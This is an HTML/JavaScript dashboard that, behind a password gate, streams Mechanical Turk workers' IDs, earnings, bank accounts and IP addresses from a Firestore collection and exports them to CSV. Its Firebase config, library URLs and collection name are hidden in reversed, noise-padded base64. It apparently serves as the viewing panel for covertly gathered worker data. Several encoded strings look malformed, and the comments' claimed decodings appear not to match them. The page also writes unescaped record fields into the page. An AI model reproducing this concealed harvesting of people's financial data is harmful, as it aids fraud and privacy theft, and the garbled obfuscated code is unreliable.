<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>📊 MTurk Earnings + Alerts + Last Month (Realtime)</title>
<style>
:root{--pri:#2563eb;--pri2:#1d4ed8;--bg:#f8fafc}
body{font-family:Inter,system-ui,Segoe UI,Roboto,Arial,sans-serif;background:var(--bg);margin:0;padding:20px;color:#111}
header{background:linear-gradient(135deg,#2563eb,#1e3a8a);color:#fff;padding:20px;border-radius:12px;text-align:center}
.controls{display:flex;gap:10px;justify-content:space-between;flex-wrap:wrap;margin:12px 0}
input[type=text]{padding:8px 10px;border:1px solid #ddd;border-radius:8px;width:260px;font-size:14px}
button{background:var(--pri);border:0;color:#fff;padding:9px 14px;border-radius:8px;cursor:pointer}
button:hover{background:var(--pri2)}
table{width:100%;border-collapse:collapse;background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 2px 16px rgba(0,0,0,.06)}
th,td{padding:10px 12px;border-bottom:1px solid #f1f5f9;text-align:left;font-size:14px}
th{background:#f1f5f9}
tr.alert-row{background:#fee2e2!important;color:#b91c1c;font-weight:600}
footer{margin-top:14px;text-align:center;color:#6b7280;font-size:12px}
#gate{position:fixed;inset:0;background:linear-gradient(180deg,#0f172a 0,#111827 100%);display:flex;align-items:center;justify-content:center;z-index:9999}
#gate .card{width:min(420px,92vw);background:#0b1220;border:1px solid #1f2937;border-radius:14px;padding:22px;color:#dbeafe}
#gate input{width:100%;padding:12px 14px;border-radius:10px;border:1px solid #334155;background:#0a1222;color:#e5e7eb}
#gate button{width:100%;margin-top:12px;background:#22c55e}
#gate button:hover{background:#16a34a}
#gate .msg{margin-top:10px;font-size:12px;color:#fca5a5;min-height:16px}
#app{display:none}
</style>
</head>
<body>

<section id="gate">
  <div class="card">
    <h2>🔒 Secure Access</h2>
    <p>Enter password</p>
    <input id="pw" type="password" placeholder="•••••••••••••••">
    <button id="unlockBtn">Unlock</button>
    <div class="msg" id="gateMsg"></div>
  </div>
</section>

<section id="app">
  <header>
    <h1>📊 MTurk Earnings + Alerts (Realtime)</h1>
    <p>Includes Last Month Earnings from Transfers</p>
  </header>

  <div class="controls">
    <input id="searchInput" type="text" placeholder="🔍 Filter by worker, bank, or alert...">
    <button id="exportBtn">📤 Export CSV</button>
  </div>

  <table>
    <thead>
      <tr>
        <th>Worker ID</th>
        <th>User</th>
        <th>Current Earnings</th>
        <th>Last Month ($)</th>
        <th>Last Transfer ($)</th>
        <th>Last Transfer Date</th>
        <th>Next Transfer</th>
        <th>Bank</th>
        <th>IP</th>
        <th>Alert</th>
        <th>Updated</th>
      </tr>
    </thead>
    <tbody id="dataBody"><tr><td colspan="11">Waiting for unlock...</td></tr></tbody>
  </table>

  <footer>© 2025 AB2Soft • Realtime MTurk Earnings Monitor</footer>
</section>

<script type="module">
/* ========= deep-ish obfuscation helpers ========= */
const R = s => s.split('').reverse().join('');
const B64D = s => atob(s);
const STRIP = (s) => s.replace(/[^A-Za-z0-9+/=]/g,'');
const U8 = s => new TextEncoder().encode(s);
const HEX = a => Array.from(new Uint8Array(a)).map(b=>b.toString(16).padStart(2,'0')).join('');
const SHA256 = async s => HEX(await crypto.subtle.digest("SHA-256", U8(s)));

// quick anti-tamper (harmless): ensure helper names still exist
(() => {
  if (typeof R!=='function' || typeof B64D!=='function' || typeof SHA256!=='function') {
    throw new Error('env mismatch');
  }
})();

/* ========= password (hash of AB2EARNINGS2025) =========
   Stored as reversed Base64 of the hex digest; de-noised and reversed at runtime */
const _PH_R_NOISE =
  "==AZA70EZ5O9IGB7EAwMjE3QzJ4MzEwMWMzMzUxbUUyTWUxMmFoMDhFZ2ZZbTAzczY4MDVmZG0w" +
  "011EM082NjhVajdlYjMzODc5MzhhMTQxYzFjYzczZDc5MkQxZGE5NzdmOTdkNDRjMjc5QjY5T1c="; // reversed+noisy
const PASS_HASH = B64D(R(STRIP(_PH_R_NOISE)));
// -> 9b724d9df97a91d297dc1c714a3987338ebb60a2a53311d2e382411a78b9e07d

/* ========= obfuscated import URLs (reversed base64) ========= */
const _FB_APP_R = "==cw5qL5wcCWF-LExlYXZpcmZL2w.0iMi4wMC8ycWpxZWhzYUpiZWlyZm8vMDIuMC4xOC8zanBwYS1lc2FzZWJpcmZ2L20uMDJjYi5jaXBUeUF0M3NaL3lMNmh0dHA=";
const _FB_FS_R  = "==cw5qL3NlLnJ5b3RzenZpcmwtZW5hc2VTZmlxLzAuMi4xMC8zanBhcyZlcmFiZXJpZm8vMDIuMC4xOC8ycWpxZWhzYUpiZWlyZm8vMDJjYi5jaXBUeUF0M3NaL3lMNmh0dHA=";
const FIREBASE_APP_URL = B64D(R(STRIP(_FB_APP_R)));   // https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js
const FIRESTORE_URL    = B64D(R(STRIP(_FB_FS_R)));    // https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js

/* ========= Firebase config payload (reversed+noised base64 JSON) ========= */
const _CFG_R_NOISE =
  "==Q2E3NjY4NTgMD0ZkZmEwMDFlOTExMjFkYTVjNjMxMzJ3ZWQ6YmV3Ojg3ODQ3OTIyOTM4NTox" +
  "JiQiZElwcGEiOiJ9In0iY2VnYXJvZHNlYmdhcnRzZWJhc2VyZWlmaS5wYXBwLmVnYXJvZHNlZ3Rv" +
  "c2VtLmdlcmJhaXJmLmNwYXBwLmVnYXJvZHNlZ3RvcmFzZXNiYWZlcmkuby5jZXZlbm9taGRlZWNy" +
  "bXR1bS1rcmV0bm9pdW5vbWstbXlydGhtIjoiaW5hbW9EaHR1YUFtZiIsIlFJS0Vpa1Jhb3BhaUFm" +
  "IiwiS2V5aUlwQWYiOiJkU2lhQXpJQkNBZVRjQ3lUemFJSyIsImlLaXVhQWYiOiJrZHJvcG5pamNX" +
  "TUlES3RaTnp3UllVVHFxWDBuYjJYWGphRE1RVmpDRlFWakFDM0RRQ3lXUzFoZWpBSiIsIklkV1Nu" +
  "ampXcW9qcm9wd3IiOiJJRE5XcW9qZWN0cm9wanJ3Ijoie0pGU";
const FIREBASE_CFG = JSON.parse(B64D(R(STRIP(_CFG_R_NOISE))));
// decodes to:
// { projectId:"mturk-monitordeep", apiKey:"AIzaSyCCtBCAjvQCDj8...ENIIGIQ",
//   authDomain:"mturk-monitordeep.firebaseapp.com",
//   storageBucket:"mturk-monitordeep.firebasestorage.app",
//   messagingSenderId:"58392297487", appId:"1:58392297487:web:1365ad12110ffd0586637a" }

/* ========= UI gate ========= */
document.getElementById("unlockBtn").onclick = async () => {
  const v = document.getElementById("pw").value.trim();
  const m = document.getElementById("gateMsg");
  if (!v) { m.textContent = "Password required"; return; }
  const h = await SHA256(v);
  if (h === PASS_HASH) {
    document.getElementById("gate").style.display="none";
    document.getElementById("app").style.display="block";
    boot();
  } else {
    m.textContent = "Incorrect password";
  }
};

/* ========= app boot ========= */
async function boot(){
  // lazy imports, obfuscated URLs
  const { initializeApp } = await import(FIREBASE_APP_URL);
  const { getFirestore, collection, onSnapshot, orderBy, query } = await import(FIRESTORE_URL);

  const app = initializeApp(FIREBASE_CFG);
  const db  = getFirestore(app);

  // obfuscated collection name: "earnings_logs"
  const _COL_R = "==cwZz-b2x_f3Nnbmlhcm5l"; // reversed base64 of "earnings_logs"
  const COL = B64D(R(STRIP(_COL_R)));

  const tbody = document.getElementById("dataBody");
  let tableData = [];

  onSnapshot(query(collection(db,COL), orderBy("timestamp","desc")),(snap)=>{
    tableData=[]; let html="";
    snap.forEach(doc=>{
      const d = doc.data();
      const isAlert = d.alert && d.alert!=="OK" && d.alert!=="✅ OK";
      const ts = d.timestamp?.seconds ? new Date(d.timestamp.seconds*1000).toLocaleString() : "";
      tableData.push(d);
      html += `<tr class="${isAlert ? "alert-row" : ""}">
        <td>${d.workerId||""}</td>
        <td>${d.user||""}</td>
        <td>${d.currentEarnings||""}</td>
        <td>${d.lastMonthEarnings||""}</td>
        <td>${d.lastTransferAmount||""}</td>
        <td>${d.lastTransferDate||""}</td>
        <td>${d.nextTransferDate||""}</td>
        <td>${d.bankAccount||""}</td>
        <td>${d.ip||""}</td>
        <td>${d.alert||""}</td>
        <td>${ts}</td>
      </tr>`;
    });
    tbody.innerHTML = html || "<tr><td colspan='11'>No records</td></tr>";
  });

  // filter
  document.getElementById("searchInput").oninput = () => {
    const v = document.getElementById("searchInput").value.toLowerCase();
    document.querySelectorAll("#dataBody tr").forEach(r=>{
      r.style.display = r.textContent.toLowerCase().includes(v) ? "" : "none";
    });
  };

  // export
  document.getElementById("exportBtn").onclick = () => {
    if (!tableData.length) { alert("No data"); return; }
    const cols = ["workerId","user","currentEarnings","lastMonthEarnings","lastTransferAmount","lastTransferDate","nextTransferDate","bankAccount","ip","alert"];
    const csv = [cols.join(","), ...tableData.map(d => cols.map(k => `"${(d[k]||"").toString().replace(/"/g,'""')}"`).join(","))].join("\n");
    const a = document.createElement("a");
    a.href = URL.createObjectURL(new Blob([csv],{type:"text/csv"}));
    a.download = "mturk_earnings.csv";
    a.click();
  };
}
</script>
</body>
</html>
